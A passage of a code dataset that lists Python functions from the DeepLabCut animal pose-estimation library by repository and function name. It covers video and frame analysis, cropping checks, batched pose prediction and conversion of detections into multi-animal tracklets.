    >>> deeplabcut.analyze_videos(
            '/analysis/project/reaching-task/config.yaml',
            [
                '/analysis/project/videos/reachingvideo1.avi',
                '/analysis/project/videos/reachingvideo2.avi',
            ],
            shuffle=2,
            save_as_csv=True,
        )
    """"""
    if 'TF_CUDNN_USE_AUTOTUNE' in os.environ:
        del os.environ['TF_CUDNN_USE_AUTOTUNE']
    if gputouse is not None:
        auxfun_models.set_visible_devices(gputouse)
    tf.compat.v1.reset_default_graph()
    start_path = os.getcwd()
    cfg = auxiliaryfunctions.read_config(config)
    trainFraction = cfg['TrainingFraction'][trainingsetindex]
    iteration = cfg['iteration']
    if cropping is not None:
        cfg['cropping'] = True
        (cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2']) = cropping
        print('Overwriting cropping parameters:', cropping)
        print(""These are used for all videos, but won't be save to the cfg file."")
    modelfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
    path_test_config = Path(modelfolder) / 'test' / 'pose_cfg.yaml'
    try:
        dlc_cfg = load_config(str(path_test_config))
    except FileNotFoundError:
        raise FileNotFoundError('It seems the model for iteration %s and shuffle %s and trainFraction %s does not exist.' % (iteration, shuffle, trainFraction))
    try:
        Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(modelfolder, 'train')) if 'index' in fn])
    except FileNotFoundError:
        raise FileNotFoundError(""Snapshots not found! It seems the dataset for shuffle %s has not been trained/does not exist.\n Be sure you also have the intended iteration number set.\n Please train it before using it to analyze videos.\n Use the function 'train_network' to train the network for shuffle %s."" % (shuffle, shuffle))
    if cfg['snapshotindex'] == 'all':
        print(""Snapshotindex is set to 'all' in the config.yaml file. Running video analysis with all snapshots is very costly! Use the function 'evaluate_network' to choose the best the snapshot. For now, changing snapshot index to -1!"")
        snapshotindex = -1
    else:
        snapshotindex = cfg['snapshotindex']
    increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
    Snapshots = Snapshots[increasing_indices]
    print('Using %s' % Snapshots[snapshotindex], 'for model', modelfolder)
    dlc_cfg['init_weights'] = os.path.join(modelfolder, 'train', Snapshots[snapshotindex])
    trainingsiterations = dlc_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
    dlc_cfg['num_outputs'] = cfg.get('num_outputs', dlc_cfg.get('num_outputs', 1))
    if batchsize is None:
        dlc_cfg['batch_size'] = cfg['batch_size']
    else:
        dlc_cfg['batch_size'] = batchsize
        cfg['batch_size'] = batchsize
    if 'multi-animal' in dlc_cfg['dataset_type']:
        dynamic = (False, 0.5, 10)
        TFGPUinference = False
    if dynamic[0]:
        print('Starting analysis in dynamic cropping mode with parameters:', dynamic)
        dlc_cfg['num_outputs'] = 1
        TFGPUinference = False
        dlc_cfg['batch_size'] = 1
        print('Switching batchsize to 1, num_outputs (per animal) to 1 and TFGPUinference to False (all these features are not supported in this mode).')
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations=trainingsiterations, modelprefix=modelprefix)
    if dlc_cfg['num_outputs'] > 1:
        if TFGPUinference:
            print('Switching to numpy-based keypoint extraction code, as multiple point extraction is not supported by TF code currently.')
            TFGPUinference = False
        print('Extracting ', dlc_cfg['num_outputs'], 'instances per bodypart')
        xyz_labs_orig = ['x', 'y', 'likelihood']
        suffix = [str(s + 1) for s in range(dlc_cfg['num_outputs'])]
        suffix[0] = ''
        xyz_labs = [x + s for s in suffix for x in xyz_labs_orig]
    else:
        xyz_labs = ['x', 'y', 'likelihood']
    if use_openvino:
        (sess, inputs, outputs) = predict.setup_openvino_pose_prediction(dlc_cfg, device=use_openvino)
    elif TFGPUinference:
        (sess, inputs, outputs) = predict.setup_GPUpose_prediction(dlc_cfg, allow_growth=allow_growth)
    else:
        (sess, inputs, outputs) = predict.setup_pose_prediction(dlc_cfg, allow_growth=allow_growth)
    pdindex = pd.MultiIndex.from_product([[DLCscorer], dlc_cfg['all_joints_names'], xyz_labs], names=['scorer', 'bodyparts', 'coords'])
    Videos = auxiliaryfunctions.get_list_of_videos(videos, videotype, in_random_order)
    if len(Videos) > 0:
        if 'multi-animal' in dlc_cfg['dataset_type']:
            from deeplabcut.pose_estimation_tensorflow.predict_multianimal import AnalyzeMultiAnimalVideo
            for video in Videos:
                AnalyzeMultiAnimalVideo(video, DLCscorer, trainFraction, cfg, dlc_cfg, sess, inputs, outputs, destfolder, robust_nframes=robust_nframes, use_shelve=use_shelve)
                if auto_track:
                    convert_detections2tracklets(config, [video], videotype, shuffle, trainingsetindex, destfolder=destfolder, modelprefix=modelprefix, calibrate=calibrate, identity_only=identity_only)
                    stitch_tracklets(config, [video], videotype, shuffle, trainingsetindex, destfolder=destfolder, n_tracks=n_tracks, modelprefix=modelprefix, save_as_csv=save_as_csv)
        else:
            for video in Videos:
                DLCscorer = AnalyzeVideo(video, DLCscorer, DLCscorerlegacy, trainFraction, cfg, dlc_cfg, sess, inputs, outputs, pdindex, save_as_csv, destfolder, TFGPUinference, dynamic, use_openvino)
        os.chdir(str(start_path))
        if 'multi-animal' in dlc_cfg['dataset_type']:
            print(""The videos are analyzed. Time to assemble animals and track 'em... \n Call 'create_video_with_all_detections' to check multi-animal detection quality before tracking."")
            print(""If the tracking is not satisfactory for some videos, consider expanding the training set. You can use the function 'extract_outlier_frames' to extract a few representative outlier frames."")
        else:
            print(""The videos are analyzed. Now your research can truly start! \n You can create labeled videos with 'create_labeled_video'"")
            print(""If the tracking is not satisfactory for some videos, consider expanding the training set. You can use the function 'extract_outlier_frames' to extract a few representative outlier frames."")
        return DLCscorer
    else:
        print(""No video(s) were found. Please check your paths and/or 'video_type'."")
        return DLCscorer"
AlexEMG/DeepLabCut,checkcropping,"def checkcropping(cfg, cap):
    print('Cropping based on the x1 = %s x2 = %s y1 = %s y2 = %s. You can adjust the cropping coordinates in the config.yaml file.' % (cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2']))
    nx = cfg['x2'] - cfg['x1']
    ny = cfg['y2'] - cfg['y1']
    if nx > 0 and ny > 0:
        pass
    else:
        raise Exception('Please check the order of cropping parameter!')
    if cfg['x1'] >= 0 and cfg['x2'] < int(cap.get(cv2.CAP_PROP_FRAME_WIDTH) + 1) and (cfg['y1'] >= 0) and (cfg['y2'] < int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT) + 1)):
        pass
    else:
        raise Exception('Please check the boundary of cropping!')
    return (int(ny), int(nx))"
AlexEMG/DeepLabCut,GetPoseF,"def GetPoseF(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, batchsize):
    """"""Batchwise prediction of pose""""""
    PredictedData = np.zeros((nframes, dlc_cfg['num_outputs'] * 3 * len(dlc_cfg['all_joints_names'])))
    batch_ind = 0
    batch_num = 0
    (ny, nx) = (int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)), int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)))
    if cfg['cropping']:
        (ny, nx) = checkcropping(cfg, cap)
    frames = np.empty((batchsize, ny, nx, 3), dtype='ubyte')
    pbar = tqdm(total=nframes)
    counter = 0
    step = max(10, int(nframes / 100))
    inds = []
    while cap.isOpened():
        if counter != 0 and counter % step == 0:
            pbar.update(step)
        (ret, frame) = cap.read()
        if ret:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            if cfg['cropping']:
                frames[batch_ind] = img_as_ubyte(frame[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2']])
            else:
                frames[batch_ind] = img_as_ubyte(frame)
            inds.append(counter)
            if batch_ind == batchsize - 1:
                pose = predict.getposeNP(frames, dlc_cfg, sess, inputs, outputs)
                PredictedData[inds] = pose
                batch_ind = 0
                inds.clear()
                batch_num += 1
            else:
                batch_ind += 1
        elif counter >= nframes:
            if batch_ind > 0:
                pose = predict.getposeNP(frames, dlc_cfg, sess, inputs, outputs)
                PredictedData[inds[:batch_ind]] = pose[:batch_ind]
            break
        counter += 1
    pbar.close()
    return (PredictedData, nframes)"
AlexEMG/DeepLabCut,GetPoseS,"def GetPoseS(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes):
    """"""Non batch wise pose estimation for video cap.""""""
    if cfg['cropping']:
        (ny, nx) = checkcropping(cfg, cap)
    PredictedData = np.zeros((nframes, dlc_cfg['num_outputs'] * 3 * len(dlc_cfg['all_joints_names'])))
    pbar = tqdm(total=nframes)
    counter = 0
    step = max(10, int(nframes / 100))
    while cap.isOpened():
        if counter != 0 and counter % step == 0:
            pbar.update(step)
        (ret, frame) = cap.read()
        if ret:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            if cfg['cropping']:
                frame = img_as_ubyte(frame[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2']])
            else:
                frame = img_as_ubyte(frame)
            pose = predict.getpose(frame, dlc_cfg, sess, inputs, outputs)
            PredictedData[counter, :] = pose.flatten()
        elif counter >= nframes:
            break
        counter += 1
    pbar.close()
    return (PredictedData, nframes)"
AlexEMG/DeepLabCut,GetPoseS_GTF,"def GetPoseS_GTF(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes):
    """"""Non batch wise pose estimation for video cap.""""""
    if cfg['cropping']:
        (ny, nx) = checkcropping(cfg, cap)
    pose_tensor = predict.extract_GPUprediction(outputs, dlc_cfg)
    PredictedData = np.zeros((nframes, 3 * len(dlc_cfg['all_joints_names'])))
    pbar = tqdm(total=nframes)
    counter = 0
    step = max(10, int(nframes / 100))
    while cap.isOpened():
        if counter != 0 and counter % step == 0:
            pbar.update(step)
        (ret, frame) = cap.read()
        if ret:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            if cfg['cropping']:
                frame = img_as_ubyte(frame[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2']])
            else:
                frame = img_as_ubyte(frame)
            pose = sess.run(pose_tensor, feed_dict={inputs: np.expand_dims(frame, axis=0).astype(float)})
            pose[:, [0, 1, 2]] = pose[:, [1, 0, 2]]
            PredictedData[counter, :] = pose.flatten()
        elif counter >= nframes:
            break
        counter += 1
    pbar.close()
    return (PredictedData, nframes)"
AlexEMG/DeepLabCut,GetPoseF_GTF,"def GetPoseF_GTF(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, batchsize):
    """"""Batchwise prediction of pose""""""
    PredictedData = np.zeros((nframes, 3 * len(dlc_cfg['all_joints_names'])))
    batch_ind = 0
    batch_num = 0
    ny = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    nx = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    if cfg['cropping']:
        (ny, nx) = checkcropping(cfg, cap)
    pose_tensor = predict.extract_GPUprediction(outputs, dlc_cfg)
    pose_tensor = tf.gather(pose_tensor, [1, 0, 2], axis=1)
    pose_tensor = tf.reshape(pose_tensor, (batchsize, -1))
    frames = np.empty((batchsize, ny, nx, 3), dtype='ubyte')
    pbar = tqdm(total=nframes)
    counter = -1
    inds = []
    while cap.isOpened() and counter < nframes - 1:
        (ret, frame) = cap.read()
        counter += 1
        if not ret:
            warnings.warn(f'Could not decode frame #{counter}.')
            continue
        if cfg['cropping']:
            frame = img_as_ubyte(frame[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2']])
        else:
            frame = img_as_ubyte(frame)
        frames[batch_ind] = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        inds.append(counter)
        if batch_ind == batchsize - 1:
            pose = sess.run(pose_tensor, feed_dict={inputs: frames})
            PredictedData[inds] = pose
            batch_ind = 0
            batch_num += 1
            inds.clear()
            pbar.update(batchsize)
        else:
            batch_ind += 1
    if batch_ind > 0:
        pose = sess.run(pose_tensor, feed_dict={inputs: frames})
        PredictedData[inds[:batch_ind]] = pose[:batch_ind]
        pbar.update(batch_ind)
    pbar.close()
    return (PredictedData, nframes)"
AlexEMG/DeepLabCut,getboundingbox,"def getboundingbox(x, y, nx, ny, margin):
    x1 = max([0, int(np.amin(x)) - margin])
    x2 = min([nx, int(np.amax(x)) + margin])
    y1 = max([0, int(np.amin(y)) - margin])
    y2 = min([ny, int(np.amax(y)) + margin])
    return (x1, x2, y1, y2)"
AlexEMG/DeepLabCut,GetPoseDynamic,"def GetPoseDynamic(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, detectiontreshold, margin):
    """"""Non batch wise pose estimation for video cap by dynamically cropping around previously detected parts.""""""
    if cfg['cropping']:
        (ny, nx) = checkcropping(cfg, cap)
    else:
        (ny, nx) = (int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)), int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)))
    (x1, x2, y1, y2) = (0, nx, 0, ny)
    detected = False
    PredictedData = np.zeros((nframes, 3 * len(dlc_cfg['all_joints_names'])))
    pbar = tqdm(total=nframes)
    counter = 0
    step = max(10, int(nframes / 100))
    while cap.isOpened():
        if counter != 0 and counter % step == 0:
            pbar.update(step)
        (ret, frame) = cap.read()
        if ret:
            originalframe = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            if cfg['cropping']:
                frame = img_as_ubyte(originalframe[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2']])[y1:y2, x1:x2]
            else:
                frame = img_as_ubyte(originalframe[y1:y2, x1:x2])
            pose = predict.getpose(frame, dlc_cfg, sess, inputs, outputs).flatten()
            detection = np.any(pose[2::3] > detectiontreshold)
            if detection:
                (pose[0::3], pose[1::3]) = (pose[0::3] + x1, pose[1::3] + y1)
                (x1, x2, y1, y2) = getboundingbox(pose[0::3], pose[1::3], nx, ny, margin)
                if not detected:
                    detected = True
            else:
                if detected and x1 + y1 + y2 - ny + x2 - nx != 0:
                    if cfg['cropping']:
                        frame = img_as_ubyte(originalframe[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2']])
                    else:
                        frame = img_as_ubyte(originalframe)
                    pose = predict.getpose(frame, dlc_cfg, sess, inputs, outputs).flatten()
                (x0, y0) = (x1, y1)
                (x1, x2, y1, y2) = (0, nx, 0, ny)
                detected = False
            PredictedData[counter, :] = pose
        elif counter >= nframes:
            break
        counter += 1
    pbar.close()
    return (PredictedData, nframes)"
AlexEMG/DeepLabCut,AnalyzeVideo,"def AnalyzeVideo(video, DLCscorer, DLCscorerlegacy, trainFraction, cfg, dlc_cfg, sess, inputs, outputs, pdindex, save_as_csv, destfolder=None, TFGPUinference=True, dynamic=(False, 0.5, 10), use_openvino='CPU' if is_openvino_available else None):
    """"""Helper function for analyzing a video.""""""
    print('Starting to analyze % ', video)
    if destfolder is None:
        destfolder = str(Path(video).parents[0])
    auxiliaryfunctions.attempt_to_make_folder(destfolder)
    vname = Path(video).stem
    try:
        _ = auxiliaryfunctions.load_analyzed_data(destfolder, vname, DLCscorer)
    except FileNotFoundError:
        print('Loading ', video)
        cap = cv2.VideoCapture(video)
        if not cap.isOpened():
            raise IOError('Video could not be opened. Please check that the the file integrity.')
        fps = cap.get(cv2.CAP_PROP_FPS)
        nframes = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
        duration = nframes * 1.0 / fps
        size = (int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)), int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)))
        (ny, nx) = size
        print('Duration of video [s]: ', round(duration, 2), ', recorded with ', round(fps, 2), 'fps!')
        print('Overall # of frames: ', nframes, ' found with (before cropping) frame dimensions: ', nx, ny)
        (dynamic_analysis_state, detectiontreshold, margin) = dynamic
        start = time.time()
        print('Starting to extract posture')
        if dynamic_analysis_state:
            (PredictedData, nframes) = GetPoseDynamic(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, detectiontreshold, margin)
        elif int(dlc_cfg['batch_size']) > 1:
            args = (cfg, dlc_cfg, sess, inputs, outputs, cap, nframes, int(dlc_cfg['batch_size']))
            if use_openvino:
                (PredictedData, nframes) = GetPoseF_OV(*args)
            elif TFGPUinference:
                (PredictedData, nframes) = GetPoseF_GTF(*args)
            else:
                (PredictedData, nframes) = GetPoseF(*args)
        elif TFGPUinference:
            (PredictedData, nframes) = GetPoseS_GTF(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes)
        else:
            (PredictedData, nframes) = GetPoseS(cfg, dlc_cfg, sess, inputs, outputs, cap, nframes)
        stop = time.time()
        if cfg['cropping'] == True:
            coords = [cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2']]
        else:
            coords = [0, nx, 0, ny]
        dictionary = {'start': start, 'stop': stop, 'run_duration': stop - start, 'Scorer': DLCscorer, 'DLC-model-config file': dlc_cfg, 'fps': fps, 'batch_size': dlc_cfg['batch_size'], 'frame_dimensions': (ny, nx), 'nframes': nframes, 'iteration (active-learning)': cfg['iteration'], 'training set fraction': trainFraction, 'cropping': cfg['cropping'], 'cropping_parameters': coords}
        metadata = {'data': dictionary}
        print(f'Saving results in {destfolder}...')
        dataname = os.path.join(destfolder, vname + DLCscorer + '.h5')
        auxiliaryfunctions.save_data(PredictedData[:nframes, :], metadata, dataname, pdindex, range(nframes), save_as_csv)
    finally:
        return DLCscorer"
AlexEMG/DeepLabCut,GetPosesofFrames,"def GetPosesofFrames(cfg, dlc_cfg, sess, inputs, outputs, directory, framelist, nframes, batchsize):
    """"""Batchwise prediction of pose for frame list in directory""""""
    from deeplabcut.utils.auxfun_videos import imread
    print('Starting to extract posture')
    im = imread(os.path.join(directory, framelist[0]), mode='skimage')
    (ny, nx, nc) = np.shape(im)
    print('Overall # of frames: ', nframes, ' found with (before cropping) frame dimensions: ', nx, ny)
    PredictedData = np.zeros((nframes, dlc_cfg['num_outputs'] * 3 * len(dlc_cfg['all_joints_names'])))
    batch_ind = 0
    batch_num = 0
    if cfg['cropping']:
        print('Cropping based on the x1 = %s x2 = %s y1 = %s y2 = %s. You can adjust the cropping coordinates in the config.yaml file.' % (cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2']))
        (nx, ny) = (cfg['x2'] - cfg['x1'], cfg['y2'] - cfg['y1'])
        if nx > 0 and ny > 0:
            pass
        else:
            raise Exception('Please check the order of cropping parameter!')
        if cfg['x1'] >= 0 and cfg['x2'] < int(np.shape(im)[1]) and (cfg['y1'] >= 0) and (cfg['y2'] < int(np.shape(im)[0])):
            pass
        else:
            raise Exception('Please check the boundary of cropping!')
    pbar = tqdm(total=nframes)
    counter = 0
    step = max(10, int(nframes / 100))
    if batchsize == 1:
        for (counter, framename) in enumerate(framelist):
            im = imread(os.path.join(directory, framename), mode='skimage')
            if counter != 0 and counter % step == 0:
                pbar.update(step)
            if cfg['cropping']:
                frame = img_as_ubyte(im[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2'], :])
            else:
                frame = img_as_ubyte(im)
            pose = predict.getpose(frame, dlc_cfg, sess, inputs, outputs)
            PredictedData[counter, :] = pose.flatten()
    else:
        frames = np.empty((batchsize, ny, nx, 3), dtype='ubyte')
        for (counter, framename) in enumerate(framelist):
            im = imread(os.path.join(directory, framename), mode='skimage')
            if counter != 0 and counter % step == 0:
                pbar.update(step)
            if cfg['cropping']:
                frames[batch_ind] = img_as_ubyte(im[cfg['y1']:cfg['y2'], cfg['x1']:cfg['x2'], :])
            else:
                frames[batch_ind] = img_as_ubyte(im)
            if batch_ind == batchsize - 1:
                pose = predict.getposeNP(frames, dlc_cfg, sess, inputs, outputs)
                PredictedData[batch_num * batchsize:(batch_num + 1) * batchsize, :] = pose
                batch_ind = 0
                batch_num += 1
            else:
                batch_ind += 1
        if batch_ind > 0:
            pose = predict.getposeNP(frames, dlc_cfg, sess, inputs, outputs)
            PredictedData[batch_num * batchsize:batch_num * batchsize + batch_ind, :] = pose[:batch_ind, :]
    pbar.close()
    return (PredictedData, nframes, nx, ny)"
AlexEMG/DeepLabCut,analyze_time_lapse_frames,"def analyze_time_lapse_frames(config, directory, frametype='.png', shuffle=1, trainingsetindex=0, gputouse=None, save_as_csv=False, modelprefix=''):
    """"""
    Analyzed all images (of type = frametype) in a folder and stores the output in one file.

    You can crop the frames (before analysis), by changing 'cropping'=True and setting 'x1','x2','y1','y2' in the config file.

    Output: The labels are stored as MultiIndex Pandas Array, which contains the name of the network, body part name, (x, y) label position 

            in pixels, and the likelihood for each frame per body part. These arrays are stored in an efficient Hierarchical Data Format (HDF) 

            in the same directory, where the video is stored. However, if the flag save_as_csv is set to True, the data can also be exported in 

            comma-separated values format (.csv), which in turn can be imported in many programs, such as MATLAB, R, Prism, etc.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    directory: string
        Full path to directory containing the frames that shall be analyzed

    frametype: string, optional
        Checks for the file extension of the frames. Only images with this extension are analyzed. The default is ``.png``

    shuffle: int, optional
        An integer specifying the shuffle index of the training dataset used for training the network. The default is 1.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml).

    gputouse: int, optional. Natural number indicating the number of your GPU (see number in nvidia-smi). If you do not have a GPU put None.
    See: https://nvidia.custhelp.com/app/answers/detail/a_id/3751/~/useful-nvidia-smi-queries

    save_as_csv: bool, optional
        Saves the predictions in a .csv file. The default is ``False``; if provided it must be either ``True`` or ``False``

    Examples
    --------
    If you want to analyze all frames in /analysis/project/timelapseexperiment1
    >>> deeplabcut.analyze_videos('/analysis/project/reaching-task/config.yaml','/analysis/project/timelapseexperiment1')
    --------

    Note: for test purposes one can extract all frames from a video with ffmeg, e.g. ffmpeg -i testvideo.avi thumb%04d.png
    """"""
    if 'TF_CUDNN_USE_AUTOTUNE' in os.environ:
        del os.environ['TF_CUDNN_USE_AUTOTUNE']
    if gputouse is not None:
        auxfun_models.set_visible_devices(gputouse)
    tf.compat.v1.reset_default_graph()
    start_path = os.getcwd()
    cfg = auxiliaryfunctions.read_config(config)
    trainFraction = cfg['TrainingFraction'][trainingsetindex]
    modelfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
    path_test_config = Path(modelfolder) / 'test' / 'pose_cfg.yaml'
    try:
        dlc_cfg = load_config(str(path_test_config))
    except FileNotFoundError:
        raise FileNotFoundError('It seems the model for shuffle %s and trainFraction %s does not exist.' % (shuffle, trainFraction))
    try:
        Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(modelfolder, 'train')) if 'index' in fn])
    except FileNotFoundError:
        raise FileNotFoundError(""Snapshots not found! It seems the dataset for shuffle %s has not been trained/does not exist.\n Please train it before using it to analyze videos.\n Use the function 'train_network' to train the network for shuffle %s."" % (shuffle, shuffle))
    if cfg['snapshotindex'] == 'all':
        print(""Snapshotindex is set to 'all' in the config.yaml file. Running video analysis with all snapshots is very costly! Use the function 'evaluate_network' to choose the best the snapshot. For now, changing snapshot index to -1!"")
        snapshotindex = -1
    else:
        snapshotindex = cfg['snapshotindex']
    increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
    Snapshots = Snapshots[increasing_indices]
    print('Using %s' % Snapshots[snapshotindex], 'for model', modelfolder)
    dlc_cfg['init_weights'] = os.path.join(modelfolder, 'train', Snapshots[snapshotindex])
    trainingsiterations = dlc_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
    dlc_cfg['batch_size'] = cfg['batch_size']
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations=trainingsiterations, modelprefix=modelprefix)
    (sess, inputs, outputs) = predict.setup_pose_prediction(dlc_cfg)
    dlc_cfg['num_outputs'] = cfg.get('num_outputs', 1)
    xyz_labs_orig = ['x', 'y', 'likelihood']
    suffix = [str(s + 1) for s in range(dlc_cfg['num_outputs'])]
    suffix[0] = ''
    xyz_labs = [x + s for s in suffix for x in xyz_labs_orig]
    pdindex = pd.MultiIndex.from_product([[DLCscorer], dlc_cfg['all_joints_names'], xyz_labs], names=['scorer', 'bodyparts', 'coords'])
    if gputouse is not None:
        auxfun_models.set_visible_devices(gputouse)
    if os.path.isdir(directory) == True:
        '\n        Analyzes all the frames in the directory.\n        '
        print('Analyzing all frames in the directory: ', directory)
        os.chdir(directory)
        framelist = np.sort([fn for fn in os.listdir(os.curdir) if frametype in fn])
        vname = Path(directory).stem
        (notanalyzed, dataname, DLCscorer) = auxiliaryfunctions.check_if_not_analyzed(directory, vname, DLCscorer, DLCscorerlegacy, flag='framestack')
        if notanalyzed:
            nframes = len(framelist)
            if nframes > 0:
                start = time.time()
                (PredictedData, nframes, nx, ny) = GetPosesofFrames(cfg, dlc_cfg, sess, inputs, outputs, directory, framelist, nframes, dlc_cfg['batch_size'])
                stop = time.time()
                if cfg['cropping'] == True:
                    coords = [cfg['x1'], cfg['x2'], cfg['y1'], cfg['y2']]
                else:
                    coords = [0, nx, 0, ny]
                dictionary = {'start': start, 'stop': stop, 'run_duration': stop - start, 'Scorer': DLCscorer, 'config file': dlc_cfg, 'batch_size': dlc_cfg['batch_size'], 'num_outputs': dlc_cfg['num_outputs'], 'frame_dimensions': (ny, nx), 'nframes': nframes, 'cropping': cfg['cropping'], 'cropping_parameters': coords}
                metadata = {'data': dictionary}
                print('Saving results in %s...' % directory)
                auxiliaryfunctions.save_data(PredictedData[:nframes, :], metadata, dataname, pdindex, framelist, save_as_csv)
                print('The folder was analyzed. Now your research can truly start!')
                print('If the tracking is not satisfactory for some frame, consider expanding the training set.')
            else:
                print('No frames were found. Consider changing the path or the frametype.')
    os.chdir(str(start_path))"
AlexEMG/DeepLabCut,_convert_detections_to_tracklets,"def _convert_detections_to_tracklets(cfg, inference_cfg, data, metadata, output_path, greedy=False, calibrate=False):
    track_method = cfg.get('default_track_method', 'ellipse')
    if track_method not in trackingutils.TRACK_METHODS:
        raise ValueError(f""Invalid tracking method. Only {', '.join(trackingutils.TRACK_METHODS)} are currently supported."")
    joints = data['metadata']['all_joints_names']
    partaffinityfield_graph = data['metadata']['PAFgraph']
    paf_inds = data['metadata']['PAFinds']
    paf_graph = [partaffinityfield_graph[l] for l in paf_inds]
    if track_method == 'box':
        mot_tracker = trackingutils.SORTBox(inference_cfg['max_age'], inference_cfg['min_hits'], inference_cfg.get('oks_threshold', 0.3))
    elif track_method == 'skeleton':
        mot_tracker = trackingutils.SORTSkeleton(len(joints), inference_cfg['max_age'], inference_cfg['min_hits'], inference_cfg.get('oks_threshold', 0.5))
    else:
        mot_tracker = trackingutils.SORTEllipse(inference_cfg.get('max_age', 1), inference_cfg.get('min_hits', 1), inference_cfg.get('iou_threshold', 0.6))
    tracklets = {}
    assembly_builder = inferenceutils.Assembler(data, max_n_individuals=inference_cfg['topktoretain'], n_multibodyparts=len(cfg['multianimalbodyparts']), graph=paf_graph, paf_inds=list(paf_inds), greedy=greedy, pcutoff=inference_cfg.get('pcutoff', 0.1), min_affinity=inference_cfg.get('pafthreshold', 0.05))
    if calibrate:
        trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
        train_data_file = os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5')
        assembly_builder.calibrate(train_data_file)
    assembly_builder.assemble()
    (output_path, _) = os.path.splitext(output_path)
    output_path += '.pickle'
    assembly_builder.to_pickle(output_path.replace('.pickle', '_assemblies.pickle'))
    if cfg['uniquebodyparts']:
        tracklets['single'] = {}
        tracklets['single'].update(assembly_builder.unique)
    for (i, imname) in tqdm(enumerate(assembly_builder.metadata['imnames'])):
        assemblies = assembly_builder.assemblies.get(i)
        if assemblies is None:
            continue
        animals = np.stack([assembly_builder.data[:, :3] for assembly_builder in assemblies])
        if track_method == 'box':
            xy = trackingutils.calc_bboxes_from_keypoints(animals, inference_cfg.get('boundingboxslack', 0))
        else:
            xy = animals[..., :2]
        trackers = mot_tracker.track(xy)
        trackingutils.fill_tracklets(tracklets, trackers, animals, imname)
    bodypartlabels = [joint for joint in joints for _ in range(3)]
    numentries = len(bodypartlabels)
    scorers = numentries * [metadata['data']['Scorer']]
    xylvalue = len(bodypartlabels) // 3 * ['x', 'y', 'likelihood']
    pdindex = pd.MultiIndex.from_arrays(np.vstack([scorers, bodypartlabels, xylvalue]), names=['scorer', 'bodyparts', 'coords'])
    tracklets['header'] = pdindex
    with open(output_path, 'wb') as f:
        pickle.dump(tracklets, f, pickle.HIGHEST_PROTOCOL)"
AlexEMG/DeepLabCut,convert_detections2tracklets,"def convert_detections2tracklets(config, videos, videotype='', shuffle=1, trainingsetindex=0, overwrite=False, destfolder=None, ignore_bodyparts=None, inferencecfg=None, modelprefix='', greedy=False, calibrate=False, window_size=0, identity_only=False, track_method=''):
    """"""
    This should be called at the end of deeplabcut.analyze_videos for multianimal projects!

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    videos : list
        A list of strings containing the full paths to videos for analysis or a path to the directory, where all the videos with same extension are stored.

    videotype: string, optional
        Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle: int, optional
        An integer specifying the shuffle index of the training dataset used for training the network. The default is 1.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml).

    overwrite: bool, optional.
        Overwrite tracks file i.e. recompute tracks from full detections and overwrite.

    destfolder: string, optional
        Specifies the destination folder for analysis data (default is the path of the video). Note that for subsequent analysis this
        folder also needs to be passed.

    ignore_bodyparts: optional
        List of body part names that should be ignored during tracking (advanced).
        By default, all the body parts are used.

    inferencecfg: Default is None.
        Configuration file for inference (assembly of individuals). Ideally
        should be obtained from cross validation (during evaluation). By default
        the parameters are loaded from inference_cfg.yaml, but these get_level_values
        can be overwritten.

    calibrate: bool, optional (default=False)
